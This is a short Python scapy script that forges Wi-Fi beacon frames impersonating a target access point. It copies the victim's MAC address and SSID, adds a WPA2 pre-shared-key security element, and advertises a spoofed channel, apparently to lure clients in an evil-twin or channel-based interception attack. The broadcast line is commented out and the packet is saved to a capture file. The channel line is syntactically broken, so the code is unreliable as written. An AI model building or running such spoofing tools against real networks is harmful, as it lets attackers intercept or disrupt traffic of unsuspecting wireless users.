#! /usr/bin/python
from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump,wrpcap
import argparse

ap = argparse.ArgumentParser()
ap.add_argument("-a", "--ap", required=True, help="Target AP MAC address")
ap.add_argument("-s", "--ssid", required=True, help="Target AP SSID")
ap.add_argument("-i", "--interface", required=True, help="Monitor mode interfaceon the correct victim channel")
ap.add_argument("-c", "--channel", required=True, help="desired spoofed channel")

args = ap.parse_args()

netSSID = 'testSSID'       #Network name here
iface = 'wlan0mon'         #Interface name here

dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=args.ap, addr3=args.ap)
beacon = Dot11Beacon(cap='ESS+privacy')
essid = Dot11Elt(ID='SSID',info=args.ssid, len=len(args.ssid))
rsn = Dot11Elt(ID='RSNinfo', info=(
'\x01\x00'                 #RSN Version 1
'\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
'\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
'\x00\x0f\xac\x04'         #AES Cipher
'\x00\x0f\xac\x02'         #TKIP Cipher
'\x01\x00'                 #1 Authentication Key Managment Suite (line below)
'\x00\x0f\xac\x02'         #Pre-Shared Key
'\x00\x00'))               #RSN Capabilities (no extra capabilities)
channel = Dot11Elt(info='\\x01\', ID=, len=1)


packet = RadioTap()/dot11/beacon/essid/rsn/channel


# packet = Dot11(proto=0, FCfield=0, subtype=8, addr4=None, addr2='58:6d:8f:07:4e:8f', addr3='58:6d:8f:07:4e:8f', addr1='ff:ff:ff:ff:ff:ff', SC=11312, type=0, ID=0)/Dot11Beacon(timestamp=2500201043, cap=4352, beacon_interval=100)/Dot11Elt(info='voip', ID=0, len=4)/Dot11Elt(info='\\x82\\x84\\x8b\\x96', ID=1, len=4)/Dot11Elt(info='\\x01', ID=3, len=1)/Dot11Elt(info='\\x00\\x01\\x00\\x00', ID=5, len=4)/Dot11Elt(info='\\x00\\x10\\x18\\x02\\x01\\xf0\\x04\\x00\\x00', ID=221, len=9)/Dot11Elt(info="\\x00P\\xf2\\x02\\x01\\x01\\x80\\x00\\x03\\xa4\\x00\\x00\'\\xa4\\x00\\x00BC\\xbc\\x00b2f\\x00", ID=221, len=24)


# packet = Dot11(proto=0, FCfield=0, subtype=8, addr4=None, addr2=args.ap, addr3=args.ap, addr1='ff:ff:ff:ff:ff:ff', SC=11312, type=0, ID=0)/Dot11Beacon(timestamp=2500201043, cap=4352, beacon_interval=100)/Dot11Elt(info=args.ssid, ID=0, len=len(args.ssid))/Dot11Elt(info='\\x82\\x84\\x8b\\x96', ID=1, len=4)/Dot11Elt(info=args.channel, ID=3, len=len(args.channel))/Dot11Elt(info='\\x00\\x01\\x00\\x00', ID=5, len=4)/Dot11Elt(info='\\x00\\x10\\x18\\x02\\x01\\xf0\\x04\\x00\\x00', ID=221, len=9)/Dot11Elt(info='\\x00P\\xf2\\x02\\x01\\x01\\x80\\x00\\x03\\xa4\\x00\\x00\\xa4\\x00\\x00BC\\xbc\\x00b2f\\x00', ID=221, len=24)




packet.show()
raw_input("\nPress enter to start\n")
wrpcap("test.pcap",packet)
# sendp(packet, iface=args.interface, inter=0.100, loop=1)

